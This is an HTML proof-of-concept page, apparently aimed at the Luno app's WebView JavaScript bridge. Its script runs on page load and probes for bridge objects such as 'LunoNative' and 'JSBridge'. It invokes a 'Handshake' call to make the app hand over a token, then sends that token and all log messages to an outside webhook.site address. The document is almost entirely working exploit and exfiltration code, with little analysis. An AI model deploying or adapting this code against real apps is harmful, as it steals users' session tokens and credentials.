<!DOCTYPE html>
<html>
<head>
    <title>Luno Security Research PoC</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 20px; word-wrap: break-word; }
        .log { border-bottom: 1px solid #333; padding: 10px 0; }
        .error { color: #ff5555; }
        .success { color: #55ff55; font-weight: bold; }
    </style>
</head>
<body>
    <h1>LUNO PWN ACTIVE</h1>
    <div id="status" class="log">Initializing...</div>
    <div id="logs"></div>

    <script>
        const webhook = "https://webhook.site/de2d6db2-6ebd-4147-9658-abe4681aa0a4";

        function log(msg, isError = false) {
            const div = document.createElement('div');
            div.className = isError ? "log error" : "log";
            div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
            document.getElementById('logs').prepend(div);
            
            // Exfiltrate log to Webhook
            fetch(webhook + "?log=" + encodeURIComponent(msg), {mode: 'no-cors'});
        }

        async function triggerExploit() {
            // Possible Bridge Names found in Smali analysis
            const bridgeNames = ['Android', 'JSBridge', 'Predictions', 'PredictionsBridge', 'LunoNative'];
            let found = false;

            document.getElementById('status').innerText = "Scanning window objects...";

            for (let name of bridgeNames) {
                if (window[name] && window[name].invoke) {
                    log("DETECTED BRIDGE: " + name, true);
                    found = true;
                    try {
                        log("Attempting Handshake on " + name + "...");
                        // This triggers the Smali zh/f1 method to return field y0
                        window[name].invoke("Handshake", "req_pwn", "{}");
                        log("Handshake Sent! Check Webhook for y0 token.", true);
                    } catch (e) {
                        log("Error invoking " + name + ": " + e.message, true);
                    }
                }
            }

            if (!found) {
                log("Primary bridges not found. Searching all window properties...");
                for (var prop in window) {
                    if (typeof window[prop] === 'object' && window[prop] !== null && window[prop].invoke) {
                        log("Found potential bridge: " + prop);
                        window[prop].invoke("Handshake", "req_pwn", "{}");
                    }
                }
                document.getElementById('status').innerHTML = "<h2 style='color:red'>BRIDGE NOT DETECTED YET</h2>";
            } else {
                document.getElementById('status').innerHTML = "<h2 style='color:lime'>EXPLOIT TRIGGERED</h2>";
            }
        }

        // Catch the response from the app (the token)
        window.onBridgeResponse = function(id, data) {
            log("RECEIVED DATA: " + JSON.stringify(data), true);
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    msg: "PWNED_TOKEN_EXFILTRATED",
                    data: data
                })
            });
        };

        // Run exploit after a short delay to ensure injection
        setTimeout(triggerExploit, 1500);
    </script>
</body>
</html>
